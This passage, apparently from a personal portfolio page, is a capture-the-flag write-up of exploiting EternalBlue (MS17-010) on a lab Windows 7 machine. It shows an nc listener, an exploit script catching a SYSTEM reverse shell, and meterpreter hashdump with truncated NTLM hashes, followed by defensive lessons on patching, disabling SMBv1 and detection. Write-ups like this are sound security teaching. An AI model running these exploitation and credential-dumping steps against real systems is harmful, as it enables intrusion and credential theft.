+        <div class="inf">Generating x64 shellcode...</div>
+        <div class="win">shellcode.bin written.</div>
+        <div class="out">&nbsp;</div>
+        <div class="out"># Step 3: start listener</div>
+        <div><span class="pr">ownuh@kali:~$</span> <span class="cmd">nc -lvnp 4444</span></div>
+        <div class="out">listening on [any] 4444 ...</div>
+      </div>
+    </div>
+
+    <div class="terminal">
+      <div class="t-bar">
+        <div class="t-bar-dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+        manual path — fire exploit + catch shell
+      </div>
+      <div class="t-body">
+        <div class="out"># In a new terminal tab</div>
+        <div><span class="pr">ownuh@kali:~$</span> <span class="cmd">python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin</span></div>
+        <div class="out">&nbsp;</div>
+        <div class="out">shellcode size: 1232</div>
+        <div class="out">numGroomConn: 13</div>
+        <div class="out">Target is 64-bit</div>
+        <div class="out">Got frag size: 0x10</div>
+        <div class="out">GROOM_POOL_SIZE: 0x5030</div>
+        <div class="out">Sending SMB1 buffers...</div>
+        <div class="win">good response</div>
+        <div class="win">done sending buffers</div>
+        <div class="win">overflow...success</div>
+        <div class="out">&nbsp;</div>
+        <div class="out"># On the listener tab</div>
+        <div class="win">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.40] 49159</div>
+        <div class="win">Microsoft Windows [Version 6.1.7601]</div>
+        <div class="win">C:\Windows\system32&gt; whoami</div>
+        <div class="win">nt authority\system</div>
+      </div>
+    </div>
+
+    <div class="tags">
+      <span class="tag t-win">SYSTEM SHELL — APPROACH A</span>
+      <span class="tag t-win">SYSTEM SHELL — APPROACH B</span>
+      <span class="tag t-info">KERNEL-LEVEL ACCESS</span>
+      <span class="tag t-info">NO PRIVESC REQUIRED</span>
+    </div>
+  </section>
+
+
+  <!-- ══════ SECTION 4: POST-EXPLOITATION ══════ -->
+  <section class="section">
+    <div class="sec-head">
+      <div class="sec-num">04</div>
+      <div class="sec-title">Post-Exploitation</div>
+      <div class="sec-rule"></div>
+    </div>
+
+    <p class="prose">
+      SYSTEM shell means the box is owned — but good post-exploitation is where you 
+      demonstrate thoroughness. I extract hashes, capture flags, and enumerate the 
+      machine to understand what a real attacker would do next.
+    </p>
+
+    <div class="terminal">
+      <div class="t-bar">
+        <div class="t-bar-dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+        meterpreter — sysinfo + hashdump + flags
+      </div>
+      <div class="t-body">
+        <div><span class="pr">meterpreter&gt;</span> <span class="cmd">sysinfo</span></div>
+        <div class="inf">Computer        : HARIS-PC</div>
+        <div class="inf">OS              : Windows 7 (6.1 Build 7601, Service Pack 1)</div>
+        <div class="inf">Architecture    : x64</div>
+        <div class="inf">System Language : en_US</div>
+        <div class="inf">Domain          : WORKGROUP</div>
+        <div class="out">&nbsp;</div>
+        <div><span class="pr">meterpreter&gt;</span> <span class="cmd">hashdump</span></div>
+        <div class="out">&nbsp;</div>
+        <div>
+          <span class="hash-user">Administrator</span><span class="hash-sep">:</span><span class="hash-user">500</span><span class="hash-sep">:</span><span class="hash-user">aad3b435b51404eeaad3b435b51404ee</span><span class="hash-sep">:</span><span class="hash-hash">cdf51891d81e62a...[NTLM]</span>
+        </div>
+        <div>
+          <span class="hash-user">haris</span><span class="hash-sep">:</span><span class="hash-user">1000</span><span class="hash-sep">:</span><span class="hash-user">aad3b435b51404eeaad3b435b51404ee</span><span class="hash-sep">:</span><span class="hash-hash">8002bc89de8f059...[NTLM]</span>
+        </div>
+        <div class="out">&nbsp;</div>
+        <div><span class="pr">meterpreter&gt;</span> <span class="cmd">shell</span></div>
+        <div class="win">C:\Windows\system32&gt;</div>
+        <div>&nbsp;</div>
+        <div><span class="cmd">type C:\Users\haris\Desktop\user.txt</span></div>
+        <div class="win">4c546aea7dbee188305e[...]</div>
+        <div>&nbsp;</div>
+        <div><span class="cmd">type C:\Users\Administrator\Desktop\root.txt</span></div>
+        <div class="win">ff548eb71e920ff6c08f[...]<span class="cur"></span></div>
+      </div>
+    </div>
+
+    <div class="postex-grid">
+      <div class="postex-card">
+        <div class="postex-icon">🔐</div>
+        <div class="postex-title">Hash Extraction</div>
+        <div class="postex-body">NTLM hashes for Administrator and haris accounts extracted. These can be cracked offline or used in pass-the-hash attacks laterally across the network.</div>
+      </div>
+      <div class="postex-card">
+        <div class="postex-icon">📁</div>
+        <div class="postex-title">Full File Access</div>
+        <div class="postex-body">SYSTEM-level access means unrestricted filesystem read/write. All user profiles, SAM database, registry hives, and sensitive documents are readable.</div>
+      </div>
+      <div class="postex-card">
+        <div class="postex-icon">🌐</div>
+        <div class="postex-title">Lateral Movement</div>
+        <div class="postex-body">With NTLM hashes and SYSTEM access, this machine becomes a pivot point. Pass-the-hash or token impersonation could compromise adjacent systems.</div>
+      </div>
+      <div class="postex-card">
+        <div class="postex-icon">🎯</div>
+        <div class="postex-title">Flags Captured</div>
+        <div class="postex-body">Both user.txt (haris desktop) and root.txt (Administrator desktop) retrieved. Box complete — but the real takeaway is the vulnerability class, not the flags.</div>
+      </div>
+    </div>
+
+    <div class="insight">
+      <div class="insight-label">⚡ Attacker Thinking</div>
+      <p>
+        In a real penetration test, the hashdump is critical — not just for this machine, but 
+        for the network. Organisations often reuse passwords across systems. One unpatched 
+        Windows 7 endpoint with SMBv1 active can cascade into a full domain compromise via 
+        <strong>pass-the-hash and lateral movement</strong>. 
+        The machine isn't the target. The <em>network</em> is the target.
+      </p>
+    </div>
+  </section>
+
+
+  <!-- ══════ SECTION 5: LESSONS ══════ -->
+  <section class="section">
+    <div class="sec-head">
+      <div class="sec-num">05</div>
+      <div class="sec-title">Analysis & Takeaways</div>
+      <div class="sec-rule"></div>
+    </div>
+
+    <p class="prose">
+      Blue isn't technically complex. The lesson here isn't about exploit development — 
+      it's about <strong>what unpatched infrastructure actually costs</strong>. 
+      Every organisation running Windows 7 without MS17-010 applied after March 2017 
+      is running this exact scenario. Real attackers know this. 
+      Defenders need to know it harder.
+    </p>
+
+    <div class="lesson-grid">
+      <div class="lesson-cell">
+        <div class="lesson-label ll-red">Root Cause</div>
+        <div class="lesson-content">
+          <strong>SMBv1 not disabled. MS17-010 patch not applied.</strong>
+          Windows 7 reached end-of-life in January 2020 — no further patches.
+          Any Windows 7 system still internet-accessible is a ticking clock.
+        </div>
+      </div>
+      <div class="lesson-cell">
+        <div class="lesson-label ll-amber">Attack Chain Simplicity</div>
+        <div class="lesson-content">
+          <strong>Zero authentication. Zero privilege escalation. One exploit.</strong>
+          There was no lateral movement needed. No password cracking.
+          This is what a CVSS 9.3 unauthenticated RCE looks like in practice.
+        </div>
+      </div>
+      <div class="lesson-cell">
+        <div class="lesson-label ll-green">Defensive Fix #1 — Patch</div>
+        <div class="lesson-content">
+          Apply MS17-010. Patch Tuesday exists for a reason.
+          <strong>Patch management policy with SLAs</strong> for critical vulns 
+          (≤30 days) is non-negotiable for any mature security programme.
+        </div>
+      </div>
+      <div class="lesson-cell">
+        <div class="lesson-label ll-green">Defensive Fix #2 — Disable SMBv1</div>
+        <div class="lesson-content">
+          SMBv1 is a 30-year-old protocol with no modern justification.
+          Disable it via Group Policy: <code>Set-SmbServerConfiguration -EnableSMB1Protocol $false</code>.
+          <strong>No SMBv1 = EternalBlue doesn't run.</strong>
+        </div>
+      </div>
+      <div class="lesson-cell">
+        <div class="lesson-label ll-blue">Defensive Fix #3 — Segment Networks</div>
+        <div class="lesson-content">
+          Block inbound TCP/445 and TCP/139 at perimeter <em>and</em> internal 
+          segment boundaries. EternalBlue spreads laterally — segmentation limits 
+          blast radius even if one machine is compromised.
+        </div>
+      </div>
+      <div class="lesson-cell">
+        <div class="lesson-label ll-blue">Defensive Fix #4 — Detect It</div>
+        <div class="lesson-content">
+          <strong>IDS/IPS signatures exist for EternalBlue.</strong>
+          Suricata rule: <code>ET EXPLOIT MS17-010 EternalBlue</code>.
+          Anomalous SMB transaction patterns on port 445 should trigger alerts 
+          and block in your SIEM regardless of patch status.
+        </div>
+      </div>
+      <div class="lesson-cell full">
+        <div class="lesson-label ll-amber">The Bigger Picture</div>
+        <div class="lesson-content">
+          <strong>EternalBlue was patched in 2017. WannaCry hit in May 2017. NotPetya hit in June 2017.</strong>
+          Two months. Hundreds of thousands of machines still unpatched. 
+          This is not a technical failure — it is an <em>operational security failure</em>. 
+          Organisations don't get compromised because they lack talent. 
+          They get compromised because patching is unglamorous and unscheduled downtime 
+          feels more painful than theoretical risk — until the ransomware hits at 3am on a Friday.
+          This box is a reminder of what that gap costs.
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- ══════ FOOTER ══════ -->
+<footer class="site-footer">
+  <div>
+    <div class="sig">OWNUH — Leona Kokerai</div>
+    <div class="sig-sub">Find me before they find you.</div>
+  </div>
+  <div class="footer-links">
+    <div>github.com/leeownuh</div>
+    <div>leeownuh.github.io/cv-resume-portfolio</div>
+    <div style="margin-top:8px; color: var(--blue); font-size:10px; letter-spacing:1px;">
+      I design systems assuming they will be attacked — and make sure they survive.
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
